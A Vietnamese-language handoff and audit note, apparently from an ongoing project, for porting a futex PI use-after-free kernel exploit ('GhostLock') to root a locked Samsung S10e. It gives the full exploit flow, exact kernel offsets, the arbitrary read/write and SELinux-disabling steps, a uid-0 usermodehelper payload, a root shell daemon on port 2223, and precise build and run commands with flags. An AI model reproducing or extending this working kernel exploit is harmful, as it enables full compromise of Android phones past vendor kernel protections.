# BÀN GIAO PHIÊN 4 — GhostLock SM-G970W (hướng B) + AUDIT

> Nguồn sự thật: file này (đã được **audit nội bộ**, xem §F). Repo exploit: WSL
> `~/ghostlock/ghostlock-oneplus` (mọi patch phiên 3–4 **đã áp dụng**, **chưa commit**).
> Snapshot pre-patch: `/root/ghostlock/_snap_core/`.

## 0. Mục tiêu (KHÔNG đổi)
Root **SM-G970W** (S10e, Snapdragon 855, 4.14.190, **BL khoá cứng — không OEM unlock**, đã xác
nhận) bằng port **GhostLock** (futex PI UAF). Trần: `MODULE_SIG_FORCE=y` ⇒ không KernelSU/Magisk;
`RKP_KDP/DMAP_PROT/CFP` ⇒ **chỉ sửa data**, không code. Chỉ có **exploit runtime** là đường root.

## 1. Trạng thái đã CHỨNG MINH (đừng làm lại)
- **(A) fops redirect + configfs arbitrary R/W**: OK. Log `cfi write ret=35`, `cfi read ret=35`,
  `cfi fops_before ret=8 value==want==fake_fops`.
- **(B) physrw qua configfs**: OK (`CFG_PHYSRW=1`, log `physrw: configfs-only mode`). Bỏ pipe slab;
  configfs read/write thực chất arbitrary R/W **không giới hạn độ dài** (đọc
  `simple_read_from_buffer(...,buffer->page,buffer->count)`; ghi `configfs_write_bin_file`→
  `simple_write_to_buffer(bin_buffer,...)`, `cb_max_size=0`).
- **UMH chạy uid 0**: `umh: result wake=1 complete=1 retval=0` + `umh_uid_0_euid_0_gid_0`.
- **SELinux off được**: `umh: step1 selinux write ok; /sys/fs/selinux/enforce='0'`.

## 2. FLOW đầy đủ (1 tiến trình, 1 boot)
1. **Khởi tạo** (`run_exploit`): `select_offsets` (khớp uname), `init_p0_profile`, `init_ashmem_path`,
   `pin_to_core(0)`, đọc `SLIDE`. `write_root_script()` (chạy bằng **uid 2000/shell**, tạo
   `.ghostlock_root.sh`).
2. **Pha walk → redirect** (`do_one_write(do_nothing=canon(ASHMEM_MISC_FOPS), mode=4)` →
   `run_main_route_threads` → `do_setsockopt_fake_lock_route`):
   - `prepare_perf_fake_page`: memfd page + leak direct-map (perf) + dựng payload giả
     (lock@0x0, W0@0x300, fops@page+0x319, `binwrite_target`@page+0x700 trong không gian page;
     chú ý `SKB_DATA_DELTA=-0xe80`).
   - 3 luồng: `owner` giữ `f_pi_target`; `waiter` (= T) `FUTEX_WAIT_REQUEUE_PI`; `consumer`
     `sched_setattr(T)` = **PI walk** `rt_mutex_adjust_prio_chain`.
   - T **paint** vùng `rt_mutex_waiter` trên kernel-stack mình bằng `setsockopt(...,1000,...)`:
     `SSOPT_EMPTY=1` ⇒ `tree_entry.__rb_parent_color = waiter` (= **RB_EMPTY_NODE**) để `[7]`
     skip; **write đến từ `[11]`** qua `W0.pi_tree` (VALUE=page+0x319, TARGET=canon(MISC_FOPS)).
   - ⚠ **Khi paint bị đè**, `[7]` chạy `rb_erase_cached(node=waiter)` với children rác ⇒ Oops/hang.
3. **`try_cfi_stage`** (chỉ chạy khi route `calls>0 && success>0`): repair fops page, mở `/dev/ashmem`,
   configfs write/read test, verify `misc_fops==fake_fops`. (`CFI_STOP_VERIFY=1` ⇒ dừng ở đây.)
4. **`restore_slide_boot_id`** (khôi phục sysctl `random/boot_id` mà pha slide đã sửa) →
   **`leak_kernel_base`** (đọc `canon(ASHMEM_FOPS)` qua configfs ⇒ tính base/slide; refresh bảng fops).
5. **`install_child_root`** (vòng `PIPE_MAX_ATTEMPTS`):
   - `CFG_PHYSRW=1` (mặc định): `install_configfs_physrw`.
   - UMH (mặc định, trừ `SKIP_UMH=1`): `install_umh_root` → chèn fake `work_struct` vào
     `system_unbound_wq` → worker `call_usermodehelper_exec_work` → exec `a/e --umh <uid>` **uid 0** →
     `handle_umh_mode` → (B25) retry proof + **fork root shell daemon `127.0.0.1:2223`**.
   - cred (trừ `SKIP_CRED=1`): `install_android_root` → fork `ll_root_child` + patch `cred`.
6. **Cleanup**: khôi phục `misc_fops`, đóng fd.
7. `ONLY_FOPS=1` ⇒ `run_exploit` **dừng sau** `do_one_write` (tránh W1/W2).

## 3. Hằng số/offset (đo bằng probe với header/config của máy)
- `struct page`: `slab_cache=0x30`, `compound_head=0x20`, `page_type=0x18`, `freelist=0x10`,
  `sizeof=0x40` (target.h cũ 0x08/0x08/0x30 — SAI).
- kmalloc enum: chỉ `NORMAL=0, RECLAIM=1, DMA=2` (ZONE_DMA=y) — **KHÔNG cgroup**; pipe_buffer dùng
  kmalloc-2k NORMAL (index 11). `KMALLOC_CGROUP_TYPE=2` trong target.h là **DMA** (sai tên).
- `struct kmem_cache`: cpu_slab 0x00, size 0x18, oo 0x28, node 0x140; `kmem_cache_cpu`: page 0x10,
  partial 0x18. (Chỉ dùng nếu làm lại pipe path — hướng B không cần.)
- Workqueue 4.14 (DWARF OSRC): `wq->dfl_pwq=0xa8`; pwq: pool 0x00, wq 0x08, work_color 0x10,
  refcnt 0x18, nr_in_flight 0x1c, nr_active 0x58, max_active 0x5c; worker_pool: worklist 0x20,
  nr_idle 0x34; `WORK_NR_COLORS=15`. `struct subprocess_info` = **96** (work=32).
- **`selinux_enforcing` = 0x02DC8CE8** (KHÔNG phải 0x02DC8CC8 = `selinux_state`); `enforcing_enabled()`
  của Samsung trả biến global `int selinux_enforcing`.
- **task_struct lệch +8 so với OSRC**: `real_cred=0x850, cred=0x858, comm=0x860`
  (pid=0x6A8, tgid=0x6AC, tasks=0x5A8 giữ nguyên).
- `anon_pipe_buf_ops=0x17A1600`, `kmalloc_caches=0x021F7798`, `system_unbound_wq=0x02999F88`,
  `call_usermodehelper_exec_work=0x0004FCDC`, `__per_cpu_offset=0x0299A6C0`.
- Slide: `slide = (IP_el0svc - 0xffffff8008000000) - 0x3bd4` (slideprobe; đổi mỗi boot).

## 4. Thay đổi code phiên 4 (hướng B)
- `target.h`: fix `STRUCT_PAGE_*`.
- `pipe_physrw.c`: `CFG_PHYSRW` mode (`configfs_physrw`) → `pipe_phys_*` gọi configfs; `install_configfs_physrw`.
- `fops.c`: `install_child_root` chọn CFG_PHYSRW/`SKIP_UMH`/`SKIP_CRED`.
- `main.c`: `FORCE_REDIRECT` (chạy redirect dù SELinux đã tắt).
- `util.c`: `binwrite_target` dời vào trong trang (`payload_base+LOCK_OFF+0x700`).
- `umh_root.c`: hằng workqueue 4.14; `subprocess_info`=96; guard `wq/pwq`; **UMH scratch dời vào trang**
  (`UMH_WORK_OFF=0x400, UMH_DATA_OFF=0x480`); `handle_umh_mode` (B25) = retry proof rồi fork daemon.
- `root.c`: hằng cred; skip SID patch; skip seccomp; timeout con 300s; `root_shell_daemon()`.
- `devices/beyond0q/offsets.h`: `off_selinux_enforcing=0x02DC8CE8`; `task_real_cred/cred/comm`.

## 5. Cờ & lệnh chạy
```
$adb='E:\Library\Desktop\platform-tools-latest-windows\platform-tools\adb.exe'
# build (WSL)
bash /mnt/e/Library/Desktop/ghostlock/build14.sh /tmp/ghostlockXX   # -> ghostlockXX_a64
# push + slide
& $adb push ghostlockXX_a64 /data/local/tmp/ghostlockXX
& $adb shell "chmod 755 /data/local/tmp/ghostlockXX; cp -f /data/local/tmp/ghostlockXX /data/local/tmp/a/e; chmod 755 /data/local/tmp/a/e"
& $adb shell "cd /data/local/tmp && timeout 40 ./slideprobe > sp.log 2>&1; grep -a -m1 bd4 sp.log"
# pha redirect (kiểm (A), dừng an toàn)
ONLY_FOPS=1 CFI_STOP_VERIFY=1 SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_PEEK=1 SSOPT_HOLD=0 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 SLIDE=0x… timeout 120 ./ghostlockXX
# pha UMH (lấy root daemon)
ONLY_FOPS=1 SKIP_CRED=1 [FORCE_REDIRECT=1] SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_PEEK=1 SSOPT_HOLD=0 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 SLIDE=0x… timeout 150 ./ghostlockXX
# root shell
& $adb forward tcp:2223 tcp:2223   # rồi connect 127.0.0.1:2223
```
Cờ: `CFG_PHYSRW`(default 1), `SKIP_UMH`, `SKIP_CRED`, `FORCE_REDIRECT`, `CFI_STOP_VERIFY`,
`SSOPT_EMPTY`, `SSOPT_FAKE_TASK`, `SSOPT_PEEK`, `SSOPT_HOLD`(code default 1, lệnh dùng 0),
`SSOPT_OWNER0`, `PSELECT_ROUTE_DELAY_USEC`, `ROUTE_SETSOCKOPT`, `SLIDE`, `WAITER_LO14`, `WRITE_PC_TEST`,
`RBROOT_OFF`,`RBLEFT_OFF`,`KPHYS`.

## 6. Kiểu lỗi + AUDIT (đúng/chưa chắc/sai)
**Hỏng chuẩn bị:** `RKP_CFP_JOPP` magic `0x00be7bad` (mọi `blr` tới hàm thật thoả); `page_base` là
**1 trang memfd** (nên mọi offset `.c` phải nằm trong trang!).

| Vị trí | Triệu chứng | Nguyên nhân (mức chắc chắn) |
|---|---|---|
| walk | log dừng `consumer: walk begin`; máy treo→watchdog; **không Oops** | paint `RB_EMPTY_NODE` bị đè ⇒ `[7] rb_erase_cached` (dumps `_WP` **thiếu trace** ⇒ **chưa chứng minh trực tiếp**) |
| walk | Oops `pc: rb_erase_cached+0x20`, **`x0=x25=waiter`** | như trên (biến thể fault; dump xác nhận offset `waiter` đúng, low14=0x3d10) |
| cred | redirect OK rồi reset | **giả thuyết KDP** (§22.7); dumps `_WP` không có fault ⇒ **chưa xác định** |
| UMH child | `open()` → `ENOKEY` | **giả thuyết fscrypt keyring**; quan sát open lúc fail lúc pass ⇒ có thể race |

**Đã đo (mẫu nhỏ, đừng coi là chắc):** e2e6 (16 lần, đường cred) = redirect OK **14/16**, rồi reset;
B25 chạy tay liên tiếp thì **fail ở walk**. ⇒ tỉ lệ walk **dao động mạnh, CHƯA đo được**. UMH "sạch,
không reset" chỉ **1 mẫu**.

**3 lỗi sai trong bản flow sớm (đã sửa ở §2):**
1. write mode-4 ở **`[11]`**, không phải `[7]` (`[7]` là đường crash khi paint hụt).
2. "walk fail ~12%" — **không đáng tin**.
3. "cred reset 100% / KDP" — **số mẫu nhỏ + giả thuyết**.

## 7. Đồ nghề / artifact (E:\Library\Desktop\ghostlock)
- Build: `ghostlockB18_a64`..`ghostlockB25_a64` (B25 = bản mới nhất, UMH daemon + keyring fix).
- Probe đo offset: `_dn_kmem.sh`, `_dn_umhprobe.sh`, `_dn_complprobe.sh`, `_dn_tcprobe.sh`,
  `_dn_wqcompile.sh` + `_dn_wqdump.py`.
- Phân tích dump (dump là **ZIP**, member kernel = `dumpstate_lastkmsg.lst`): `kp_scan.py`,
  `_dn_fault*.py`, `_dn_stuck.py`, `_dn_block.py`. `adb shell` ở group `log` nên `adb pull /data/log/…` được.
- Patch code: `_dn_patchB*.py`. Loop (đã dừng): `_dn_e2e*.ps1`. ROOT shell helper: `_dn_rootshell.ps1`.
- Ghi chú: `_dn_session4.md`, `_dn_init_hooks.md`.

## 8. Việc kế tiếp (KHÔNG làm lại phần đã xong)
1. **Chốt nguyên nhân walk stall** (chưa có trace). Ý tưởng: `SSOPT_HOLD=1` (block T trong kernel),
   đo tỉ lệ nhiều lần; hoặc lấy panic trace bằng `*_KP` dump.
2. **Xác nhận root daemon dùng được** (B25) qua 1 lần walk thành công → `.ghostlock_rootshell=uid=0` →
   `_dn_rootshell.ps1`.
3. Xác minh/loại **giả thuyết KDP (cred)** và **fscrypt (ENOKEY)**.
4. Autostart: `persist.adb.tcp.port` hoặc app (không đụng partition; L3/L4 để riêng).

## 9. An toàn
Không bước nào đụng bootloader/partition/flash. Đã dời UMH scratch + CFI target **vào trong trang**
(trước ghi ra ngoài trang 4 KB). `adb reboot` dùng để reset; **tránh `adb uninstall`**.

## 10. Prompt phiên sau
Xem `PROMPT_PHIEN_5.md` (nhiệm vụ: **AUDIT**, không phát triển thêm).
